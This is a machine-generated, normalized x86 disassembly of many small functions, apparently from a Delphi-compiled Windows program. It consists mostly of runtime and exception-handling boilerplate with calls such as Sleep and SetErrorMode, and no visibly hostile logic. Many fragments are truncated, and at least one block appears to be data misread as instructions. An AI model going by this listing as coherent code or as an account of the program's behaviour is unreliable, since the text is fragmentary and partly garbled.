pop ebx
retn
sub_40876c
push ebx
mov ebx eax
mov eax ebx
call sub_403f5c
pop ebx
retn
sub_408acf
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f5c
pop eax
pop ebx
retn
sub_408d87
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408ee2
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40923f
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40923f
sub_4092fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40441c
mov edx esi
xor ecx ecx
call sub_409188
pop esi
pop ebx
retn
sub_409370
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40441c
mov edx esi
mov cl 0x1
call sub_409188
pop esi
pop ebx
retn
sub_4099ea
jmp sub_403960
sub_4099f1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ae2
jmp sub_403960
sub_409ae9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a28d
jmp sub_403960
sub_40a294
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a31c
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a2c0
pop ebp
retn 0x8
sub_40a461
jmp sub_403960
sub_40a468
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a90b
jmp sub_403960
sub_40a912
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40adf7
jmp sub_403960
sub_40adfe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40aea9
jmp sub_403960
sub_40aeb0
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40af53
jmp sub_403960
sub_40af5a
pop esi
pop ecx
pop ebp
retn
sub_40b136
jmp sub_403960
sub_40b13d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b194
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b486
jmp sub_403960
sub_40b554
jmp sub_403960
sub_40b57c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4031d8
sub_40b678
pop ebx
retn
sub_40b718
jmp sub_403960
sub_40b71f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b728
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403998
sub_40b735
retn
sub_40b738
push ebp
mov ebp esp
call sub_40b67c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b728
pop ebp
retn 0x4
sub_40b754
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
retn
sub_40b7ec
push ebx
mov ebx eax
mov eax ebx
call sub_40b76c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b9bf
jmp sub_403960
sub_40b9c6
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ba8b
jmp sub_403960
sub_40ba92
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40ba9c
call sub_40b328
mov eax 0x1
call sub_403f44
sub_40bc20
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bcf9
jmp sub_403960
sub_40bd16
jmp sub_403960
sub_40bd1d
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bdc8
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bd2c
mov ecx eax
sub_40bfb4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40bfd4
push eax
call CharNextA
retn
sub_40c1f8
jmp sub_403960
sub_40c1ff
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c268
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c6bf
jmp sub_403960
sub_40c6c6
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40c804
jmp sub_403960
sub_40c80b
pop ebx
mov esp ebp
pop ebp
retn
sub_40c810
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c774
sub_40c820
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c83c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026dc
pop ebx
retn
sub_40c8c4
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c8d0
xchg [ eax ] edx
mov eax edx
retn
sub_40c930
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40c9c0
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cad8
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cb00
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cd7b
jmp sub_403960
sub_40cd82
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cdf0
jmp sub_403960
sub_40cdf7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce15
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40ce0e
jmp sub_403960
sub_40ce15
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d264
retn
sub_40d265
jmp sub_403960
j_sub_40d264
jmp sub_40d264
sub_40d26c
pop ebp
retn
sub_40d2d8
jmp sub_403960
sub_40d2df
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d358
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d3be
jmp sub_403960
sub_40d3c5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d42a
jmp sub_403960
sub_40d431
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d496
jmp sub_403960
sub_40d49d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d502
jmp sub_403960
sub_40d509
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d56e
jmp sub_403960
sub_40d575
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d5ed
jmp sub_403960
sub_40d5f4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d660
jmp sub_403960
sub_40d667
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d6d0
jmp sub_403960
sub_40d6d7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d744
jmp sub_403960
sub_40d74b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40dad1
jmp sub_403960
sub_40dad8
pop ebp
retn
sub_40dadc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d7a0
sub_40daed
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e10e
jmp sub_403960
sub_40e115
pop ecx
pop ebp
retn
sub_40e1a7
jmp sub_403960
sub_40e1ae
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e1fe
jmp sub_403960
sub_40e205
pop ecx
pop ebp
retn
sub_40e297
jmp sub_403960
sub_40e29e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e2ee
jmp sub_403960
sub_40e2f5
pop ecx
pop ebp
retn
sub_40e53d
jmp sub_403960
sub_40e544
pop ebx
mov esp ebp
pop ebp
retn
sub_40e5d6
jmp sub_403960
sub_40e5dd
pop ecx
pop ebp
retn
sub_40e5e0
push ebx
mov ebx eax
mov eax ebx
call sub_40e878
mov [ ebx ] 0x1
pop ebx
retn
sub_40e878
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e7fc
retn
mov [ eax ] 0x0
retn
sub_40e88c
push eax
call sub_40e878
pop eax
retn
sub_40eaec
call sub_40eba0
retn
sub_40ed0a
jmp sub_403960
sub_40ed11
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40edb5
jmp sub_403960
sub_40edbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edde
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404654
retn
sub_40edd7
jmp sub_403960
sub_40edde
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee3a
jmp sub_403960
sub_40ee41
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eebd
jmp sub_403960
sub_40f403
jmp sub_403960
sub_40f40a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f49d
jmp sub_403960
sub_40f4a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4c1
lea eax [ ebp - 0x14 ]
call sub_40463c
retn
sub_40f4ba
jmp sub_403960
sub_40f4c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f51e
jmp sub_403960
sub_40f525
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f5c7
jmp sub_403960
sub_40f5e4
jmp sub_403960
sub_40f5eb
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb46
jmp sub_403960
sub_40fb4d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fbf8
push eax
call sub_40e878
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fc0c
push eax
call sub_40e878
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fc84
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40eba0
add esp 0x10
sub_40ff2e
jmp sub_403960
sub_40ff35
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ff78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e878
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40ff90
mov edx 0x80020004
call sub_40ff78
retn
sub_410021
jmp sub_403960
sub_410028
pop esi
pop ebx
pop ebp
retn
sub_41002c
push ebp
mov ebp esp
call sub_4101ec
pop ebp
retn 0x4
sub_4100b8
push ebp
mov ebp esp
call sub_4101ec
pop ebp
retn 0x4
sub_41019b
jmp sub_403960
sub_4101a2
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403214
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403580
sub_4101c4
xor eax eax
retn
sub_4101c8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4101dc
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4101e4
call sub_40e0c4
retn
sub_4101ec
call sub_40e1b4
retn
sub_4101f4
call sub_40e58c
retn
sub_4101fc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410210
call sub_4101ec
retn
sub_410218
push ebp
mov ebp esp
call sub_4101f4
pop ebp
retn 0x8
sub_410230
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_41030c
jmp sub_403960
sub_4103d5
jmp sub_403960
sub_4103dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4103f9
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
sub_4103f2
jmp sub_403960
sub_4103f9
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410404
call sub_40e5e0
retn
sub_41047b
jmp sub_403960
sub_410482
pop ebp
retn
sub_410525
jmp sub_403960
sub_41052c
pop ebp
retn
sub_41063d
jmp sub_403960
sub_410644
pop ebp
retn
sub_410648
sub [ rw-data ] 0x1
retn
sub_41067c
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_410900
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403fb0
pop esi
pop ebx
retn
sub_41099c
jmp sub_403960
sub_4109a3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_410a9e
jmp sub_403960
sub_410aa5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410ca4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40eba0
pop esi
pop ebx
retn
sub_410e26
jmp sub_403960
sub_410e2d
pop ebp
retn
sub_410e30
sub [ rw-data ] 0x1
retn
sub_410e5d
jmp sub_403960
sub_410e64
pop ebp
retn
sub_410e68
sub [ rw-data ] 0x1
retn
sub_411775
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4140d0
sub_4124d4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_4125f8
mov eax [ eax + 0xc ]
call sub_4137bc
retn
sub_4128cf
jmp sub_403960
sub_4128d6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4128dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413974
test eax eax
setge al
pop esi
pop ebx
retn
sub_412bdf
jmp sub_403960
sub_412be6
mov esp ebp
pop ebp
retn
sub_412cb4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412cc0
push ebx
mov ebx edx
mov edx ebx
call sub_412ad4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_412834
sub_412d6c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412ec7
jmp sub_403960
sub_412f9b
jmp sub_403960
sub_412fac
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_413018
jmp sub_403960
sub_41301f
pop ebx
mov esp ebp
pop ebp
retn
sub_41306a
jmp sub_403960
sub_413071
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4130fd
jmp sub_403960
sub_413104
pop ebx
pop ebp
retn
sub_41314a
jmp sub_403960
sub_413151
pop ebx
pop ebp
retn
sub_413196
jmp sub_403960
sub_41319d
pop ebx
pop ebp
retn
sub_4131e7
jmp sub_403960
sub_4131ee
pop esi
pop ebx
pop ebp
retn
sub_413242
jmp sub_403960
sub_413249
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413376
jmp sub_403960
sub_41344c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_413a5c
sub_41353c
jmp sub_403960
sub_4136c6
jmp sub_403960
sub_4136cd
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413767
jmp sub_403960
sub_41376e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41378d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_413786
jmp sub_403960
sub_41378d
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_4137f0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413ab8
xor edx edx
mov eax ebx
call sub_413a7c
pop ebx
retn
sub_413868
mov eax [ ebp + 0x4 ]
retn
sub_41389e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4138ec
jmp sub_403960
sub_4138f3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4138f8
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413910
xor edx edx
call sub_413918
retn
sub_413a00
mov edx [ eax + 0x8 ]
dec edx
call sub_413918
retn
sub_413b28
retn
sub_413be2
jmp sub_403960
sub_413be9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403580
sub_413c78
jmp sub_403960
sub_413c7f
pop ebx
pop ecx
pop ebp
retn
sub_413c84
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413cdb
jmp sub_403960
sub_413ce2
pop ebx
pop ecx
pop ebp
retn
sub_413ce8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413d24
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
retn
sub_413d3c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413e17
retn
sub_413ebc
test edx edx
je r-xdata
xor edx edx
call sub_413ed0
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_413f86
jmp sub_403960
sub_413f8d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413fa0
xchg edx eax
call sub_413ed0
retn
sub_413fa8
retn
sub_414041
jmp sub_403960
sub_414048
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414192
jmp sub_403960
sub_4142a2
jmp sub_403960
sub_4142a9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4142c6
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_4142bf
jmp sub_403960
sub_4142c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414350
jmp sub_403960
sub_414368
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414424
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4144cd
jmp sub_403960
sub_4144d4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4144e0
mov eax [ ebp + 0x4 ]
retn
sub_414516
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414564
jmp sub_403960
sub_41456b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41462a
jmp sub_403960
sub_414631
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414653
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f80
retn
sub_41464c
jmp sub_403960
sub_414653
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41465c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_414664
xor eax eax
retn
sub_4146ad
jmp sub_403960
sub_4146b4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4147c7
jmp sub_403960
sub_4147ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414863
jmp sub_403960
sub_41486a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4148e8
jmp sub_403960
sub_4148ef
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4149bf
jmp sub_403960
sub_4149c6
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414a7c
jmp sub_403960
sub_414a83
pop esi
pop ecx
pop ebp
retn
sub_414b08
jmp sub_403960
sub_414b0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b2c
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
sub_414b25
jmp sub_403960
sub_414b2c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414bb8
jmp sub_403960
sub_414bd5
jmp sub_403960
sub_414bdc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414c18
retn
sub_414c9b
jmp sub_403960
sub_414ca2
mov eax [ ebp - 0x8 ]
call sub_417888
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414cc7
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_414cc0
jmp sub_403960
sub_414cc7
mov esp ebp
pop ebp
retn
sub_414d17
jmp sub_403960
sub_414d1e
pop esi
pop ecx
pop ebp
retn
sub_414d71
jmp sub_403960
sub_414d78
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d80
retn
sub_414dfb
jmp sub_403960
sub_414e02
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414e9f
jmp sub_403960
sub_414ea6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ec3
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
sub_414ebc
jmp sub_403960
sub_414ec3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414ec8
retn
sub_414f68
jmp sub_403960
sub_414f6f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414fee
jmp sub_403960
sub_414ff5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414ffc
mov eax edx
mov edx ecx
call sub_407bbc
retn
sub_415008
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_415020
sub_415098
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_415108
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415124
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415318
mov eax [ eax + 0x18 ]
retn
sub_41531c
mov eax [ eax + 0x14 ]
retn
sub_4153b8
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_4155c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4026fc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415600
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415618
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41562c
mov edx sub_415618
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_415674
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407bbc
retn
mov eax edx
mov edx ecx
call sub_407b84
retn
sub_415710
retn
sub_415a08
jmp sub_403960
sub_415a0f
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415a70
jmp sub_403960
sub_415a77
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415abc
mov eax [ eax + 0x4 ]
call sub_40827c
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415acc
mov eax [ eax + 0x4 ]
call sub_4082a8
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415b08
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415cb1
jmp sub_403960
sub_415d10
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_415da0
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_415df0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_415fdb
jmp sub_403960
sub_415fe2
mov esp ebp
pop ebp
retn
sub_41608c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
retn
sub_416114
mov [ eax + 0x18 ] edx
retn
sub_416290
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_41081c
retn
sub_416317
jmp sub_403960
sub_41631e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4163ca
jmp sub_403960
sub_4163d1
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416575
jmp sub_403960
sub_4165c7
jmp sub_403960
sub_4165e6
jmp sub_403960
sub_4165ed
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41660c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416605
jmp sub_403960
sub_41660c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4166af
jmp sub_403960
sub_416737
jmp sub_403960
sub_416744
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
pop ebx
retn
sub_41675c
mov eax [ rw-data ]
call sub_416744
retn
sub_416794
push ebx
call sub_4106d4
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41675c
sub_416901
jmp sub_403960
sub_416908
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403f5c
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_416a28
jmp sub_403960
sub_416a2f
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416b26
jmp sub_403960
sub_416b43
jmp sub_403960
sub_416b4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416c48
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_415690
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_416d0c
push ebx
mov ebx eax
mov eax ebx
call sub_4186c0
cmp al 0x9
sete al
pop ebx
retn
sub_416d6b
jmp sub_403960
sub_416d72
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_416e18
jmp sub_403960
sub_416e1f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416e38
jmp eax
sub_41709e
jmp sub_4036ac
sub_4170ca
jmp sub_4036ac
sub_41716c
jmp sub_4036ac
sub_41720f
jmp sub_4036ac
sub_4173e7
jmp sub_4036ac
sub_417429
jmp sub_403960
sub_417459
jmp sub_403960
sub_417460
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4174cf
jmp sub_403960
sub_4175a6
jmp sub_403960
sub_4175ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417880
mov dl 0x1
call sub_4167e8
retn
sub_4179b8
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_4179c1
jmp sub_403960
j_sub_4179b8
jmp sub_4179b8
sub_4179c8
pop ebx
mov esp ebp
pop ebp
retn
sub_4179d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4187d0
mov eax [ rw-data ]
call sub_416744
pop ebp
retn
j_sub_4037d8
jmp sub_4037d8
j_sub_4037d8#2
jmp sub_4037d8
sub_417b76
add [ eax ] eax
add [ eax ] al
in al 0x6d
inc eax
add [ edx - 0x76ffbe85 ] al
retn
sub_417bbc
jmp sub_403960
sub_417bc3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ca3
jmp sub_403960
sub_417caa
mov esp ebp
pop ebp
retn
sub_417d62
jmp sub_403960
sub_417d69
pop ecx
pop ecx
pop ebp
retn
sub_41806b
jmp sub_403960
sub_418072
pop ebx
mov esp ebp
pop ebp
retn
sub_418317
jmp sub_403960
sub_41831e
xor eax eax
